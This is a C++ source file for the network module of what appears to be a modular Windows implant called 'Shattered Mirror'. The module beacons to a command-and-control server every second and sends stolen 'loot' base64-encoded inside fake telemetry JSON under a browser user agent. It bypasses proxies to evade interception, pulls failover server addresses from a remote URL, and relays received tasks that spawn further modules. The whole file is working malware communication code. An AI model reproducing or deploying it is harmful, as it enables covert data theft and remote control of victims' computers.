/*=============================================================================
 * Shattered Mirror v1 — Atom 01: Network Communicator
 * OPTION B: Dual pipes – receives forwarded reports on command pipe,
 *            sends telemetry directly to C2 via WinHTTP.
 * HIGH-SPEED VERSION: Persistent sessions + Fast Draining
 *===========================================================================*/

#include "Atom_01_Net.h"
#include "../Orchestrator/AtomManager.h"
#include "../Orchestrator/Config.h"
#include "../Orchestrator/Logger.h"
#include <cstdio>
#include <ctime>
#include <string>

#pragma comment(lib, "winhttp.lib")

/* --- PERSISTENT STATE --- */
static char  s_ActiveDomain[256] = {0};
static int   s_ActivePort = 0;
static char g_PrimaryDomain[256] = {0};
static int g_PrimaryPort = 0;
static int g_FailedPulses = 0;

static HINTERNET g_hSession = NULL;
static HINTERNET g_hConnect = NULL;

static void CleanupHttp() {
    if (g_hConnect) { WinHttpCloseHandle(g_hConnect); g_hConnect = NULL; }
    if (g_hSession) { WinHttpCloseHandle(g_hSession); g_hSession = NULL; }
}

static void LoadC2Config() {
    char oldDomain[256];
    int oldPort = g_PrimaryPort;
    strcpy_s(oldDomain, g_PrimaryDomain);

    Config::GetActiveC2Target(g_PrimaryDomain, sizeof(g_PrimaryDomain), &g_PrimaryPort);
    
    // If target changed, reset persistent connection
    if (strcmp(oldDomain, g_PrimaryDomain) != 0 || oldPort != g_PrimaryPort) {
        CleanupHttp();
    }
}

static void SaveC2Config(const char *domain, int port) {
    FILE *f = fopen("C:\\Users\\Public\\sm_net.cfg", "w");
    if (f) {
        fprintf(f, "%s:%d", domain, port);
        fclose(f);
    }
    strcpy_s(g_PrimaryDomain, domain);
    g_PrimaryPort = port;
    CleanupHttp(); // Reset connection for new target
}

static BOOL FetchFailoverConfig(char *szDomainOut, int *pPortOut) {
    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0)",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    if (!hSession) return FALSE;

    URL_COMPONENTS urlComp = {0};
    urlComp.dwStructSize = sizeof(urlComp);
    WCHAR szHost[256] = {0}, szPath[512] = {0};
    urlComp.lpszHostName = szHost;
    urlComp.dwHostNameLength = 256;
    urlComp.lpszUrlPath = szPath;
    urlComp.dwUrlPathLength = 512;

    WCHAR wUrl[512] = {0};
    MultiByteToWideChar(CP_ACP, 0, Config::FAILOVER_URL, -1, wUrl, 512);

    if (!WinHttpCrackUrl(wUrl, 0, 0, &urlComp)) {
        WinHttpCloseHandle(hSession);
        return FALSE;
    }

    HINTERNET hConnect = WinHttpConnect(hSession, szHost,
        (urlComp.nScheme == INTERNET_SCHEME_HTTPS) ? 443 : 80, 0);
    if (!hConnect) {
        WinHttpCloseHandle(hSession);
        return FALSE;
    }

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", szPath, NULL, NULL, NULL,
        (urlComp.nScheme == INTERNET_SCHEME_HTTPS) ? WINHTTP_FLAG_SECURE : 0);
    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return FALSE;
    }

    BOOL bResult = FALSE;
    if (WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0)) {
        if (WinHttpReceiveResponse(hRequest, NULL)) {
            DWORD dwStatus = 0;
            DWORD dwSize = sizeof(dwStatus);
            WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, 
                               WINHTTP_HEADER_NAME_BY_INDEX, &dwStatus, &dwSize, WINHTTP_NO_HEADER_INDEX);

            if (dwStatus == 200) {
                char buf[256] = {0};
                DWORD dwRead = 0;
                WinHttpReadData(hRequest, buf, sizeof(buf) - 1, &dwRead);
                buf[dwRead] = '\0';

                for (int i = (int)dwRead - 1; i >= 0; i--) {
                    if (buf[i] == '\n' || buf[i] == '\r' || buf[i] == ' ') buf[i] = '\0';
                    else break;
                }

                char *colon = strchr(buf, ':');
                if (colon) {
                    *colon = '\0';
                    strcpy_s(szDomainOut, 256, buf);
                    *pPortOut = atoi(colon + 1);
                    bResult = TRUE;
                    char logBuf[512];
                    snprintf(logBuf, sizeof(logBuf), "FAILOVER | Retrieved new target: %s:%d", szDomainOut, *pPortOut);
                    Logger::Log(INFO, logBuf);
                }
            } else {
                char logBuf[512];
                snprintf(logBuf, sizeof(logBuf), "FAILOVER | GitHub returned status %lu (Not a valid IP)", dwStatus);
                Logger::Log(ERROR_LOG, logBuf);
            }
        }
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return bResult;
}

static void Base64Encode(const BYTE *pBuf, DWORD dwLen, char *szOut) {
  if (!pBuf || !szOut) return;
  static const char cb64[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
  int i, j;
  for (i = 0, j = 0; i < (int)dwLen; i += 3) {
    int v = pBuf[i];
    v = (v << 8) | (i + 1 < (int)dwLen ? pBuf[i + 1] : 0);
    v = (v << 8) | (i + 2 < (int)dwLen ? pBuf[i + 2] : 0);
    szOut[j++] = cb64[(v >> 18) & 0x3F];
    szOut[j++] = cb64[(v >> 12) & 0x3F];
    if (i + 1 < (int)dwLen) szOut[j++] = cb64[(v >> 6) & 0x3F]; else szOut[j++] = '=';
    if (i + 2 < (int)dwLen) szOut[j++] = cb64[v & 0x3F]; else szOut[j++] = '=';
  }
  szOut[j] = '\0';
}

/*---------------------------------------------------------------------------
 *  TransmitPulse (High Speed)
 *-------------------------------------------------------------------------*/
BOOL TransmitPulse(const BYTE *pOptionalLoot, DWORD dwLength, DWORD dwAtomId, char *szTaskOut,
                   DWORD dwMaxTask) {
  
  if (!g_hSession) {
      // Use NO_PROXY to avoid system-level delays or interception
      g_hSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)", 
                               WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
      if (!g_hSession) return FALSE;
      
      // INCREASE TIMEOUTS for laggy VM connections
      DWORD dwTime = 15000; // 15s
      WinHttpSetTimeouts(g_hSession, dwTime, dwTime, dwTime, dwTime);
  }

  const char *activeDomain = (s_ActiveDomain[0] != '\0') ? s_ActiveDomain : g_PrimaryDomain;
  int activePort = (s_ActivePort > 0) ? s_ActivePort : g_PrimaryPort;

  if (!g_hConnect) {
      WCHAR wDomain[256] = {0};
      MultiByteToWideChar(CP_ACP, 0, activeDomain, -1, wDomain, 256);
      g_hConnect = WinHttpConnect(g_hSession, wDomain, (INTERNET_PORT)activePort, 0);
      if (!g_hConnect) return FALSE;
  }

  HINTERNET hRequest = WinHttpOpenRequest(
      g_hConnect, L"POST", L"/api/v2/telemetry", NULL, NULL, NULL,
      (activePort == 443 ? WINHTTP_FLAG_SECURE : 0));
  if (!hRequest) {
    char logBuf[512];
    snprintf(logBuf, sizeof(logBuf), "NET | Failed to open request to %s:%d", activeDomain, activePort);
    Logger::Log(ERROR_LOG, logBuf);
    CleanupHttp(); // Reset on failure
    return FALSE;
  }

  std::wstring headers = L"Content-Type: application/json\r\nX-Telemetry-ID: " +
                         std::wstring(Config::PSK_ID, Config::PSK_ID + strlen(Config::PSK_ID)) + L"\r\n";
  WinHttpAddRequestHeaders(hRequest, headers.c_str(), -1, WINHTTP_ADDREQ_FLAG_ADD);

  static char szJsonBody[262144]; // Increased for larger bursts
  if (pOptionalLoot && dwLength > 0) {
    char *szB64 = (char *)malloc(((dwLength + 2) / 3) * 4 + 1);
    if (szB64) {
      Base64Encode(pOptionalLoot, dwLength, szB64);
      snprintf(szJsonBody, sizeof(szJsonBody), "{\"report_id\":\"loot\",\"diagnostic_blob\":\"%s\",\"atom_id\":%lu}", szB64, dwAtomId);
      free(szB64);
    }
  } else {
    snprintf(szJsonBody, sizeof(szJsonBody), "{\"report_id\":\"hb_pulse\",\"diagnostic_blob\":\"\"}");
  }

  BOOL bResult = FALSE;
  if (WinHttpSendRequest(hRequest, NULL, 0, (LPVOID)szJsonBody, (DWORD)strlen(szJsonBody), (DWORD)strlen(szJsonBody), 0)) {
    if (WinHttpReceiveResponse(hRequest, NULL)) {
      bResult = TRUE;
      DWORD dwSize = 0;
      if (WinHttpQueryDataAvailable(hRequest, &dwSize) && dwSize > 0) {
        if (dwSize < dwMaxTask) {
          WinHttpReadData(hRequest, (LPVOID)szTaskOut, dwSize, &dwSize);
          szTaskOut[dwSize] = '\0';
        }
      }
    }
  }

  if (!bResult) {
      g_FailedPulses++;
      char logBuf[512];
      snprintf(logBuf, sizeof(logBuf), "NET | Pulse failed (%d) to %s:%d. Re-handshaking next cycle.", g_FailedPulses, activeDomain, activePort);
      Logger::Log(ERROR_LOG, logBuf);
      CleanupHttp(); // Connection might be stale
  } else {
      g_FailedPulses = 0; // Reset on success
  }
  WinHttpCloseHandle(hRequest);
  return bResult;
}

DWORD WINAPI NetworkAtomMain(LPVOID lpParam) {
  DWORD dwAtomId = (DWORD)(ULONG_PTR)lpParam;
  HANDLE hCmdPipe = IPC_ConnectToCommandPipe(dwAtomId);
  HANDLE hReportPipe = IPC_ConnectToReportPipe(dwAtomId);
  if (!hCmdPipe || !hReportPipe) return 1;

  BYTE SharedSessionKey[16];
  memcpy(SharedSessionKey, Config::PSK_ID, 16);

  IPC_MESSAGE readyMsg = {0};
  readyMsg.dwSignature = 0x534D4952;
  readyMsg.CommandId = CMD_READY;
  IPC_SendMessage(hReportPipe, &readyMsg, SharedSessionKey, 16);

  Logger::Log(INFO, "NET | Network Atom Online. Persistent Session mode active.");

  LoadC2Config();

  while (TRUE) {
    char szTaskBuffer[2048] = {0};
    LoadC2Config();

    s_ActiveDomain[0] = '\0'; s_ActivePort = 0;
    s_ActiveDomain[0] = '\0'; s_ActivePort = 0;
    if (!TransmitPulse(NULL, 0, 0, szTaskBuffer, 2048)) {
        // Only trigger failover if primary fails
        char fDomain[256]; int fPort;
        if (FetchFailoverConfig(fDomain, &fPort)) {
            s_ActivePort = fPort;
            strcpy_s(s_ActiveDomain, fDomain);
            TransmitPulse(NULL, 0, 0, szTaskBuffer, 2048);
        }
    }

    auto ProcessIncomingTask = [&](char* buffer, HANDLE hReport) {
        if (strlen(buffer) > 0) {
            if (strncmp(buffer, "SET_DOMAIN:", 11) == 0) {
                char *args = buffer + 11;
                char *colon = strchr(args, ':');
                if (colon) { *colon = '\0'; SaveC2Config(args, atoi(colon + 1)); memset(buffer, 0, 2048); return; }
            }
            if (strstr(buffer, "\"atom_id\"")) {
                char *pAtom = strstr(buffer, "\"atom_id\"");
                char *pPayload = strstr(buffer, "\"payload\"");
                if (pAtom && pPayload) {
                    char *pAtomColon = strchr(pAtom, ':');
                    char *pPayloadColon = strchr(pPayload, ':');
                    if (pAtomColon && pPayloadColon) {
                        int atom_id = atoi(pAtomColon + 1);
                        char *pPayloadStart = strchr(pPayloadColon, '"');
                        if (pPayloadStart) {
                            pPayloadStart++;
                            char *pPayloadEnd = strchr(pPayloadStart, '"');
                            if (pPayloadEnd) {
                                DWORD dwLen = (DWORD)(pPayloadEnd - pPayloadStart);
                                char formattedPayload[2048];
                                snprintf(formattedPayload, sizeof(formattedPayload), "%d:%.*s", atom_id, (int)dwLen, pPayloadStart);
                                IPC_MESSAGE taskMsg = {0};
                                taskMsg.dwSignature = 0x534D4952;
                                taskMsg.CommandId = CMD_SPAWN_ATOM;
                                taskMsg.dwPayloadLen = min((DWORD)strlen(formattedPayload), MAX_IPC_PAYLOAD_SIZE - 1);
                                memcpy(taskMsg.Payload, formattedPayload, taskMsg.dwPayloadLen);
                                IPC_SendMessage(hReport, &taskMsg, SharedSessionKey, 16);
                                memset(buffer, 0, 2048);
                            }
                        }
                    }
                }
            }
        }
    };

    ProcessIncomingTask(szTaskBuffer, hReportPipe);

    // --- HIGH SPEED BURST MODE ---
    DWORD dwIdleWait = 1000; // 1s beacon normally
    DWORD dwSlept = 0;
    while (dwSlept < dwIdleWait) {
      DWORD dwAvail = 0;
      if (PeekNamedPipe(hReportPipe, NULL, 0, NULL, &dwAvail, NULL) && dwAvail > 0) {
        IPC_MESSAGE inMsg = {0};
        if (IPC_ReceiveMessage(hReportPipe, &inMsg, SharedSessionKey, 16)) {
            if (inMsg.CommandId == CMD_FORWARD_REPORT || inMsg.CommandId == CMD_BALE_REPORT) {
              TransmitPulse(inMsg.Payload, inMsg.dwPayloadLen, inMsg.AtomId, szTaskBuffer, 2048);
              ProcessIncomingTask(szTaskBuffer, hReportPipe);
              // BURST: If we just sent data, immediately check for more data (don't wait)
              continue; 
            }
        }
      }
      if (PeekNamedPipe(hCmdPipe, NULL, 0, NULL, &dwAvail, NULL) && dwAvail > 0) {
        IPC_MESSAGE inMsg = {0};
        if (IPC_ReceiveMessage(hCmdPipe, &inMsg, SharedSessionKey, 16)) {
            if (inMsg.CommandId == CMD_EXECUTE) {
                char cmdBuffer[2048] = {0};
                memcpy(cmdBuffer, inMsg.Payload, min((DWORD)2047, inMsg.dwPayloadLen));
                ProcessIncomingTask(cmdBuffer, hReportPipe);
                continue;
            }
        }
      }
      Sleep(100);
      dwSlept += 100;
    }
  }
  CleanupHttp();
  return 0;
}